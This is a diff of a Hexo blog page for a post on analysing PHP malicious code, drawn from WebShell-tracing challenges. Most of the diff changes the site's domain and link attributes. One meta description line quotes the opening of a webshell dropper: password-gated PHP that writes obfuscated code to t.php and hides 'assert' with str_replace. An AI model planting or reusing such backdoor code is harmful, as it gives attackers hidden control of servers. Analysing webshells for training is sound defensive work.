@@ -25,27 +25,27 @@
 <meta name="keywords" content="php,代码审计,web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP恶意代码分析">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;index.html">
+<meta property="og:url" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;index.html">
 <meta property="og:site_name" content="13l00m&#39;World">
 <meta property="og:description" content="墨者学院–WebShell代码分析溯源(第11题) &amp;lt;?php if(!empty($_GET[1]) &amp;amp;&amp;amp; $_GET[1]==&amp;apos;GET.fPZ87&amp;apos;) 	&amp;#123; 		$_=@fopen(&amp;apos;t.php&amp;apos;, &amp;apos;a&amp;apos;); 		@fwrite($_,&quot;&amp;lt;?php \$_=str_replace(&amp;apos;ilo&amp;apos;,&amp;apos;ass&amp;apos;,str_replace(&amp;apos;vey&amp;apos;,&amp;apos;ert&amp;apos;,\">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第11题)&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第11题)&#x2F;2.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第11题)&#x2F;3.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第10题)&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第9题)&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第8题)&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第7题)&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第6题)&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第5题)&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第4题)&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第3题)&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第2题)&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第1题)&#x2F;1.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;PHP代码分析溯源(第4题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第11题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第11题)&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第11题)&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第10题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第9题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第8题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第7题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第6题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第5题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第4题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第3题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第2题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第1题)&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;PHP代码分析溯源(第4题)&#x2F;1.png">
 <meta property="og:updated_time" content="2019-11-28T04:15:08.280Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第11题)&#x2F;1.png">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;13l00m.github.io&#x2F;2019&#x2F;11&#x2F;28&#x2F;PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90&#x2F;恶意代码分析&#x2F;墨者学院--WebShell代码分析溯源(第11题)&#x2F;1.png">
     
         <link rel="alternate" type="application/atom+xml" title="13l00m&#39;World" href="/atom.xml">
     
@@ -63,7 +63,7 @@
 
     <aside id="menu" class="hide" >
   <div class="inner flex-row-vertical">
-    <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off" target="">
         <i class="icon icon-lg icon-close"></i>
     </a>
     <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
@@ -123,23 +123,23 @@
     <main id="main">
         <header class="top-header" id="header">
     <div class="flex-row">
-        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle" target="">
           <i class="icon icon-lg icon-navicon"></i>
         </a>
         <div class="flex-col header-title ellipsis">PHP恶意代码分析</div>
         
         <div class="search-wrap" id="search-wrap">
-            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="back">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back" target="">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
             <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
-            <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search" target="">
                 <i class="icon icon-lg icon-search"></i>
             </a>
         </div>
         
         
-        <a href="javascript:;" target="_blank" rel="noopener" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare" target="">
             <i class="icon icon-lg icon-share-alt"></i>
         </a>
         
@@ -455,7 +455,7 @@
     </div>
     
     <footer>
-        <a href="http://yoursite.com">
+        <a href="https://13l00m.github.io">
             <img src="/img/avatar.jpg" alt="13l00m">
             13l00m
         </a>
@@ -464,7 +464,7 @@
 
         
 <div class="page-reward">
-    <a id="rewardBtn" href="javascript:;" target="_blank" rel="noopener" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light" target="">赏</a>
 </div>
 
 
@@ -481,7 +481,7 @@
 <div class="page-share" id="pageShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&title=《PHP恶意代码分析》 — 13l00m'World&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="" href="http://service.weibo.com/share/share.php?url=https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&title=《PHP恶意代码分析》 — 13l00m'World&pic=https://13l00m.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -491,22 +491,22 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&title=《PHP恶意代码分析》 — 13l00m'World&source=" data-title=" QQ">
+        <a class="qq share-sns" target="" href="http://connect.qq.com/widget/shareqq/index.html?url=https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&title=《PHP恶意代码分析》 — 13l00m'World&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
       <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" data-title=" Facebook">
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" data-title=" Facebook">
           <i class="icon icon-facebook"></i>
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PHP恶意代码分析》 — 13l00m'World&url=http://yoursite.com/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&via=http://yoursite.com" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PHP恶意代码分析》 — 13l00m'World&url=https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&via=https://13l00m.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
       <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" data-title=" Google+">
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" data-title=" Google+">
           <i class="icon icon-google-plus"></i>
         </a>
       </li>
@@ -515,7 +515,7 @@
 
 
 
-    <a href="javascript:;" target="_blank" rel="noopener" id="shareFab" class="page-share-fab waves-effect waves-circle">
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle" target="">
         <i class="icon icon-share-alt icon-lg"></i>
     </a>
 </div>
@@ -529,7 +529,7 @@
 <nav class="post-nav flex-row flex-justify-between">
   
     <div class="waves-block waves-effect prev">
-      <a href="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" id="post-prev" class="post-nav-link">
+      <a href="/2020/03/07/%E3%80%90%E9%9D%B6%E6%9C%BA%E3%80%91%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" id="post-prev" class="post-nav-link" target="">
         <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
         <h4 class="title">【靶机】记一次简单的内网渗透测试</h4>
       </a>
@@ -538,7 +538,7 @@
 
   
     <div class="waves-block waves-effect next">
-      <a href="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/" id="post-next" class="post-nav-link">
+      <a href="/2019/11/28/mysql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%B9%E6%B3%95%E5%8F%8A%E5%8E%9F%E7%90%86%E6%95%B4%E7%90%86/" id="post-next" class="post-nav-link" target="">
         <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
         <h4 class="title">mysql注入漏洞方法及原理整理</h4>
       </a>
@@ -581,7 +581,7 @@
 </article>
 
 <div id="reward" class="page-modal reward-lay">
-    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <a class="close" href="javascript:;" target=""><i class="icon icon-close"></i></a>
     <h3 class="reward-title">
         <i class="icon icon-quote-left"></i>
         谢谢~
@@ -634,7 +634,6 @@
         <p><span>13l00m &copy; 2015 - 2020</span>
             <span>
                 
-                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
             </span>
         </p>
     </div>
@@ -642,14 +641,14 @@
 
     </main>
     <div class="mask" id="mask"></div>
-<a href="javascript:;" target="_blank" rel="noopener" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light" target=""><span class="icon icon-lg icon-chevron-up" target=""></span></a>
 
 
 
 <div class="global-share" id="globalShare">
     <ul class="reset share-icons">
       <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&title=《PHP恶意代码分析》 — 13l00m'World&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+        <a class="weibo share-sns" target="" href="http://service.weibo.com/share/share.php?url=https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&title=《PHP恶意代码分析》 — 13l00m'World&pic=https://13l00m.github.io/img/avatar.jpg" data-title="微博">
           <i class="icon icon-weibo"></i>
         </a>
       </li>
@@ -659,22 +658,22 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&title=《PHP恶意代码分析》 — 13l00m'World&source=" data-title=" QQ">
+        <a class="qq share-sns" target="" href="http://connect.qq.com/widget/shareqq/index.html?url=https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&title=《PHP恶意代码分析》 — 13l00m'World&source=" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
       <li>
-        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" data-title=" Facebook">
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" data-title=" Facebook">
           <i class="icon icon-facebook"></i>
         </a>
       </li>
       <li>
-        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PHP恶意代码分析》 — 13l00m'World&url=http://yoursite.com/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&via=http://yoursite.com" data-title=" Twitter">
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PHP恶意代码分析》 — 13l00m'World&url=https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/&via=https://13l00m.github.io" data-title=" Twitter">
           <i class="icon icon-twitter"></i>
         </a>
       </li>
       <li>
-        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" data-title=" Google+">
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://13l00m.github.io/2019/11/28/PHP%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" data-title=" Google+">
           <i class="icon icon-google-plus"></i>
         </a>
       </li>
@@ -685,7 +684,7 @@
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAADPElEQVR42u3a0W7iQAwFUP7/p1mpT7taSK/tIBHnzBNqSzInSL3YnscjXs+fdfyT/3+evD6+498rucvJCxsbG/si7OfhSi79blvvrnNMSv6yev0Xd8HGxsZex06iqHr7sx5NLzJ/MWJjY2Pfkn0cM9VQzCPt3EeDjY2NfWf28e2ToJq0kCYlEzY2NvYd2HkTp9ppzzF5QOYfzwm9NGxsbOyvZ1cHvd/8+oPzbWxsbOyvZD+LK2nxVJtNeSBNdv7PdbCxsbEXsXsHK3uN/l5TqVqoFO6LjY2NvY5dPXzT22hSVHzuytjY2Nj72Hl0VcuJfFTcu37+8bz4e2xsbOxF7LwMOLeFlA9fc1gSgeXqBxsbG3sFuzotzaPr+GHle6juFhsbG/tu7GosfYLdK3jK4wFsbGzsi7Pzr/iTU469xlDvAFA0FcHGxsa+OLt65KU6TpgfwTkue/KjRS+mItjY2Ngr2Mdbzy/aK0V6IZSPMcoHd7CxsbEvyO4VA9XAqzaSekVOvrCxsbE3sXuBVH1AvRCalCtR0wobGxt7Bbs31s03lD+sajj1WlfY2NjY92FXx7p5Oykn5eA83h75FrGxsbEvwp6XHL0tTvCFs0j54UtsbGzsy7KrX+57A9dkc9XiZ9LSwsbGxt7Ezkezj8FKmlBJ/ExaVFFuY2NjY1+W/YnVK0jyI57V4MTGxsbezT7+dXVz+Y0n5Upefrz9GLCxsbGXsqsj27PS4RMj5+ZUBBsbG/tS7LyhX42ovJCYxFKzpMHGxsZex07+9fcCpjeynURdFM/Y2NjY69g9cDIMyN9VLUuqQ4IX7SRsbGzsFezeMZ28CVU9fFPl9Zpi2NjY2JvYCbgXZsnDqgZhXsD8YsHGxsZex843PR/9TtpPpz0abGxs7HXsfOXj1Xn85O/K94mNjY29j927Zd4S6hUz1VKneoQIGxsbex87b8qX2zdBU2kSos0RLzY2NvZSdt7QzwuVXlDl+0lC9+27sLGxsW/JnlQ580eT8ApBi42NjX17dvmrf/AIekctkyH0qBTBxsbGvgg7aSpVZwtnMeatq7cBho2Njb2CPRn09o719MbA+XigWkRhY2NjX5b9BwwYq89JJwjyAAAAAElFTkSuQmCC" alt="微信分享二维码">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAADKElEQVR42u3ay47iMBAFUP7/p5ltSwzh3nKQEnO8QmkSfIzURT0ej3g9X9br9b9X8rv+Xn/9xOP9JO9cWtjY2Ng3YT8PV8JLkPnrnJoc6NvDxcbGxt6OPQsSeejKw9jxZ7Vfxtvr2NjY2D/MniUk7Wflh4iNjY2N/T12W2w63tVx8oONjY2NnQeGd9tty1LJXZeopWFjY2Nfnp13Ra//+iv9bWxsbOwLs5/lWhmpSQJY3h5YWdjY2Ng7sdtxmRm1HetpQ9Rw/9jY2NhbsPMSUoJpi0R5iGqTog/HgY2Njb0duy3NzFqzbel/NtATJTnY2NjY27HzhGGWGKykKLOy1IcDxcbGxt6OnWPOGpFpmwRnNRiG9SpsbGzsC7NXfuivBLAVcF7w+rBzbGxs7C3Y7T/9lXZCjk+SnzxBOqGWho2NjX1h9kqykYeN2bhPG+TykIaNjY29HzsPXW1jtR3NacdxVt6PjY2NvR+7HcRpD6sdDJolP8dPeOQMbGxs7Buy283Nko22nLQ+uFOkItjY2Ni3ZefhapYAtEX8JF3JmxDY2NjYe7PzR6y0VNtNrzR6o51jY2Njb80+q3h01ju/MsqDjY2N/QPsPHc5oUwf33taooKNjY29Ebst3CelpSQVaZsNNSkJwNjY2NhbsL9X+p+1dWeDm/WTsbGxsTdir9RYZqM2eejKi0rJ14ONjY29NzvZ6HO0Zvfm+1lPmbCxsbHvzs5vnjUGVkhJYjMLkNjY2Ng7sWcF+jaBOav1m5e9osQDGxsbeyP2ShG/PaD1dOW0g8DGxsbelD37ud8W/dvmbtKWTkT/6XJjY2Njb8RuuwotLH9mG1DbsR5sbGzsXdltyX4W8Nabuy1+WFTCxsbGvgl7ZQSnLUutFJ7akZ0TkhBsbGzsm7DztZ5ItMlM3kLO91PjsbGxsW/CngWtNnTNgmUbDov2AzY2NvZ27LZdetZf22JTHoHr9gA2Njb2j7FnIzvJ0xLw7OixsbGxsWcN1zZRGY7gtMOa2NjY2Nux29bsSuLRJiHJoXyxPYCNjY19eXYeePJyfNvQzdsPK4OY2NjY2Nux/wGDp/h072XJcQAAAABJRU5ErkJggg==" alt="微信分享二维码">
 </div>
 
 
@@ -706,7 +705,7 @@ var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
 </div>
 <template id="search-tpl">
 <li class="item">
-    <a href="{path}" class="waves-block waves-effect">
+    <a href="{path}" class="waves-block waves-effect" target="">
         <div class="title ellipsis" title="{title}">{title}</div>
         <div class="flex-row flex-middle">
             <div class="tags ellipsis">
